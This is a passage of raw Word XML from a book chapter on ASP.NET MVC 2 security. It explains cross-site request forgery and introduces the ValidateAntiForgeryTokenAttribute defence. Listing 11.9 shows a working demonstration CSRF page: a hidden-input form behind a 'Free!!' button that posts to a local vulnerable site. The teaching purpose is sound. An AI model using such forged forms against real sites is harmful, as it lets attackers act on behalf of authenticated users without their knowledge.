        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00665DBB" w:rsidRPr="00665DBB" w:rsidRDefault="00665DBB" w:rsidP="00665DBB">
      <w:pPr>
        <w:pStyle w:val="Body1"/>
      </w:pPr>
      <w:r>
        <w:t>It's not easy to enable XSS</w:t>
      </w:r>
      <w:ins w:id="245" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="009835A9">
        <w:rPr>
          <w:rPrChange w:id="246" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>XSS</w:instrText>
      </w:r>
      <w:ins w:id="247" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> in ASP.NET MVC 2, thankfully.  But it can be done</w:t>
      </w:r>
      <w:r w:rsidR="00EF4C68">
        <w:t>, and all developers should take care to do everything necessary to prevent this common attack</w:t>
      </w:r>
      <w:ins w:id="248" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="00D21A77">
        <w:rPr>
          <w:rPrChange w:id="249" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>attack</w:instrText>
      </w:r>
      <w:ins w:id="250" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00EF4C68">
        <w:t>.  Next we'll look at XSRF</w:t>
      </w:r>
      <w:ins w:id="251" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00530C72">
        <w:rPr>
          <w:rPrChange w:id="252" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>XSRF</w:instrText>
      </w:r>
      <w:ins w:id="253" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00EF4C68">
        <w:t>, another common vulnerability in web apps.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003B62DA" w:rsidRDefault="003B62DA" w:rsidP="003B62DA">
      <w:pPr>
        <w:pStyle w:val="Head1"/>
      </w:pPr>
      <w:r>
        <w:t>11.3 Cross Site Request Forgery</w:t>
      </w:r>
      <w:ins w:id="254" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00740F85">
        <w:rPr>
          <w:rPrChange w:id="255" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>Cross Site Request Forgery</w:instrText>
      </w:r>
      <w:ins w:id="256" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> (XSRF</w:t>
      </w:r>
      <w:ins w:id="257" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00530C72">
        <w:rPr>
          <w:rPrChange w:id="258" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>XSRF</w:instrText>
      </w:r>
      <w:ins w:id="259" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007F6C8C" w:rsidRPr="007F6C8C" w:rsidRDefault="007F6C8C" w:rsidP="007F6C8C">
      <w:pPr>
        <w:pStyle w:val="Body1"/>
      </w:pPr>
      <w:r>
        <w:t>Cross site request forgery</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="00E8467D">
        <w:instrText>request forgery</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is an attack</w:t>
      </w:r>
      <w:ins w:id="260" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="00D21A77">
        <w:rPr>
          <w:rPrChange w:id="261" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>attack</w:instrText>
      </w:r>
      <w:ins w:id="262" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> where an attacking web site presents a form to the user that, once submitted, issues a request to a vulnerable</w:t>
      </w:r>
      <w:ins w:id="263" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00EF6E66">
        <w:rPr>
          <w:rPrChange w:id="264" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>vulnerable</w:instrText>
      </w:r>
      <w:ins w:id="265" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> web application.  The vulnerable web application processes the request normally because the hoodwinked user remains authenticated on the vulnerable site.  In this situation, the vulnerable site has no way of knowing whether the submitted request came from itself, which is normal behavior, or from a third party site.  The fix, included in ASP.NET MVC 2, is to provide a token that secure sites can use to ensure that requests are generated only from pages it controls.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003B62DA" w:rsidRDefault="003B62DA" w:rsidP="003B62DA">
      <w:pPr>
        <w:pStyle w:val="Head2"/>
      </w:pPr>
      <w:r>
        <w:t>11.3.1 XSRF</w:t>
      </w:r>
      <w:ins w:id="266" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00530C72">
        <w:rPr>
          <w:rPrChange w:id="267" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>XSRF</w:instrText>
      </w:r>
      <w:ins w:id="268" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> In Action</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007F6C8C" w:rsidRDefault="007F6C8C" w:rsidP="007F6C8C">
      <w:pPr>
        <w:pStyle w:val="Body1"/>
      </w:pPr>
      <w:r>
        <w:t>In the example code for this chapter we've included a working XSRF</w:t>
      </w:r>
      <w:ins w:id="269" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00530C72">
        <w:rPr>
          <w:rPrChange w:id="270" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>XSRF</w:instrText>
      </w:r>
      <w:ins w:id="271" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> demonstration. Again, there are two sites in the solution: a vulnerable</w:t>
      </w:r>
      <w:ins w:id="272" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00EF6E66">
        <w:rPr>
          <w:rPrChange w:id="273" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>vulnerable</w:instrText>
      </w:r>
      <w:ins w:id="274" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> one and the attacker.  The vulnerable site accepts a simple form post.  If you imagine the secure commands we issue in the course of a regular day - transferring funds between bank accounts, buying or selling securities, authorizing raises, it could be profitable for a hacker to formulate a special request on your behalf and have you </w:t>
      </w:r>
      <w:r w:rsidR="00B208FC">
        <w:t xml:space="preserve">unknowingly </w:t>
      </w:r>
      <w:r>
        <w:t>transmit it to a site you are known to visit.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007F6C8C" w:rsidRDefault="007F6C8C" w:rsidP="007F6C8C">
      <w:pPr>
        <w:pStyle w:val="Body"/>
      </w:pPr>
      <w:r>
        <w:t>Our attacking site is shown in figure 11.6.  This button just begs to be clicked.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007F6C8C" w:rsidRDefault="007F6C8C" w:rsidP="007F6C8C">
      <w:r w:rsidRPr="007F6C8C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="4800600" cy="384564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800600" cy="3845642"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln w="9525">
                      <a:noFill/>
                      <a:miter lim="800000"/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="007F6C8C" w:rsidRDefault="007F6C8C" w:rsidP="007F6C8C">
      <w:pPr>
        <w:pStyle w:val="FigureCaption"/>
      </w:pPr>
      <w:r>
        <w:t>Figure 11.6 Enticing the user to click a button</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007F6C8C" w:rsidRDefault="007F6C8C" w:rsidP="007F6C8C">
      <w:pPr>
        <w:pStyle w:val="Body"/>
      </w:pPr>
      <w:r>
        <w:t>Behind the scenes in the bowels of the HTML source another story is told, shown in listing 11.9.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007F6C8C" w:rsidRDefault="007F6C8C" w:rsidP="007F6C8C">
      <w:pPr>
        <w:pStyle w:val="CodeListingCaption"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Listing 11.9 </w:t>
      </w:r>
      <w:r w:rsidR="002D1A58">
        <w:t xml:space="preserve">This </w:t>
      </w:r>
      <w:r>
        <w:t>XSRF</w:t>
      </w:r>
      <w:ins w:id="275" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00530C72">
        <w:rPr>
          <w:rPrChange w:id="276" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>XSRF</w:instrText>
      </w:r>
      <w:ins w:id="277" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="002D1A58">
        <w:t>example page can be used to breach secruity</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007F6C8C" w:rsidRPr="007F6C8C" w:rsidRDefault="007F6C8C" w:rsidP="007F6C8C">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="007F6C8C">
        <w:t xml:space="preserve">&lt;form method="post" </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007F6C8C" w:rsidRPr="007F6C8C" w:rsidRDefault="007F6C8C" w:rsidP="007F6C8C">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="007F6C8C">
        <w:t xml:space="preserve">action="http://localhost:8082/home/save"&gt; </w:t>
      </w:r>
      <w:r w:rsidR="008A0733">
        <w:t xml:space="preserve">   #1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007F6C8C" w:rsidRPr="007F6C8C" w:rsidRDefault="007F6C8C" w:rsidP="007F6C8C">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="007F6C8C">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007F6C8C" w:rsidRPr="007F6C8C" w:rsidRDefault="007F6C8C" w:rsidP="007F6C8C">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="007F6C8C">
        <w:t xml:space="preserve">&lt;input id="Name" name="Name" </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007F6C8C" w:rsidRPr="007F6C8C" w:rsidRDefault="007F6C8C" w:rsidP="007F6C8C">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="007F6C8C">
        <w:t xml:space="preserve">type="hidden" value="gotcha!" /&gt; </w:t>
      </w:r>
      <w:r w:rsidR="008A0733">
        <w:t xml:space="preserve">            #2</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007F6C8C" w:rsidRPr="007F6C8C" w:rsidRDefault="007F6C8C" w:rsidP="007F6C8C">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="007F6C8C">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007F6C8C" w:rsidRPr="007F6C8C" w:rsidRDefault="007F6C8C" w:rsidP="007F6C8C">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="007F6C8C">
        <w:t xml:space="preserve">&lt;button type="submit"&gt;Free!!&lt;/button&gt; </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007F6C8C" w:rsidRPr="007F6C8C" w:rsidRDefault="007F6C8C" w:rsidP="007F6C8C">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="007F6C8C">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007F6C8C" w:rsidRDefault="007F6C8C" w:rsidP="007F6C8C">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="007F6C8C">
        <w:t>&lt;/form&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008A0733" w:rsidRDefault="008A0733" w:rsidP="008A0733">
      <w:pPr>
        <w:pStyle w:val="CodeAnnotation"/>
      </w:pPr>
      <w:r>
        <w:t>#1 Form posts to another site</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008A0733" w:rsidRDefault="008A0733" w:rsidP="008A0733">
      <w:pPr>
        <w:pStyle w:val="CodeAnnotation"/>
      </w:pPr>
      <w:r>
        <w:t>#2 Inputs are hidden</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008A0733" w:rsidRPr="007F6C8C" w:rsidRDefault="008A0733" w:rsidP="008A0733">
      <w:pPr>
        <w:pStyle w:val="Body1"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>When the aloof user clicks the button, the form is submitted.</w:t>
      </w:r>
      <w:r w:rsidR="00DE2917">
        <w:t xml:space="preserve">  Not even the </w:t>
      </w:r>
      <w:r w:rsidR="00DE2917" w:rsidRPr="00DE2917">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>AuthorizeAttribute</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="002A6483">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:instrText>AuthorizeAttribute</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="00DE2917">
        <w:t xml:space="preserve"> can save us now; we're already logged in! Figure 11.7 shows the result.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007F6C8C" w:rsidRDefault="00DE2917" w:rsidP="00DE2917">
      <w:r w:rsidRPr="00DE2917">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="4800600" cy="384564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800600" cy="3845642"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln w="9525">
                      <a:noFill/>
                      <a:miter lim="800000"/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DE2917" w:rsidRDefault="00DE2917" w:rsidP="00DE2917">
      <w:pPr>
        <w:pStyle w:val="FigureCaption"/>
      </w:pPr>
      <w:r>
        <w:t>Figure 11.7 The form is posted to the vulnerable</w:t>
      </w:r>
      <w:ins w:id="278" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00EF6E66">
        <w:rPr>
          <w:rPrChange w:id="279" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>vulnerable</w:instrText>
      </w:r>
      <w:ins w:id="280" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> site</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007F6C8C" w:rsidRPr="007F6C8C" w:rsidRDefault="00DE2917" w:rsidP="007F6C8C">
      <w:pPr>
        <w:pStyle w:val="Body"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">A savvy attacker would have used </w:t>
      </w:r>
      <w:r w:rsidR="005B5616">
        <w:t>JavaScript</w:t>
      </w:r>
      <w:ins w:id="281" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="00630D9B">
        <w:rPr>
          <w:rPrChange w:id="282" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>JavaScript</w:instrText>
      </w:r>
      <w:ins w:id="283" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidR="005B5616">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">to submit our request, stifling the response from our browser so we'd never knew it </w:t>
      </w:r>
      <w:r w:rsidR="005B5616">
        <w:t>occurred</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="005B5616">
        <w:t xml:space="preserve">— </w:t>
      </w:r>
      <w:r>
        <w:t>until it was too late.</w:t>
      </w:r>
      <w:r w:rsidR="001F21FC">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>ASP.NET MVC 2 provides a simple mechanism for combating this vulnerability.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003B62DA" w:rsidRDefault="003B62DA" w:rsidP="003B62DA">
      <w:pPr>
        <w:pStyle w:val="Head2"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">11.3.2 </w:t>
      </w:r>
      <w:r w:rsidRPr="003B62DA">
        <w:t>ValidateAntiForgeryTokenAttribute</w:t>
      </w:r>
      <w:ins w:id="284" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="0014436C">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
          <w:rPrChange w:id="285" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
            <w:rPr>
              <w:rStyle w:val="CodeinText"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>ValidateAntiForgeryTokenAttribute</w:instrText>
      </w:r>
      <w:ins w:id="286" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00DE2917" w:rsidRDefault="00DE2917" w:rsidP="00DE2917">
      <w:pPr>
        <w:pStyle w:val="Body1"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r w:rsidRPr="00DE2917">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>ValidateAntiForgeryTokenAttribute</w:t>
      </w:r>
      <w:ins w:id="287" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
        <w:r w:rsidR="004962CC">
          <w:rPr>
            <w:rStyle w:val="CodeinText"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="0014436C">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
          <w:rPrChange w:id="288" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
            <w:rPr>
              <w:rStyle w:val="CodeinText"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>ValidateAntiForgeryTokenAttribute</w:instrText>
      </w:r>
      <w:ins w:id="289" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:rPr>
            <w:rStyle w:val="CodeinText"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t>, when applied to an action, requires that the input be accompanied by a special token that ensures it</w:t>
      </w:r>
      <w:r w:rsidR="005B5616">
        <w:t>'</w:t>
      </w:r>
      <w:r>
        <w:t>s from the responding application only.  It must be used in tandem with a special HTML helper</w:t>
      </w:r>
      <w:ins w:id="290" w:author="Jeffrey" w:date="2010-03-15T16:35:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="003F2F87">
        <w:rPr>
          <w:rPrChange w:id="291" w:author="Jeffrey" w:date="2010-03-15T16:35:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>HTML helper</w:instrText>
      </w:r>
      <w:ins w:id="292" w:author="Jeffrey" w:date="2010-03-15T16:35:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> that </w:t>
      </w:r>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>outputs the token in the form in the HTML source.  Listing 11.10 shows the attribute on our vulnerable</w:t>
      </w:r>
      <w:ins w:id="293" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
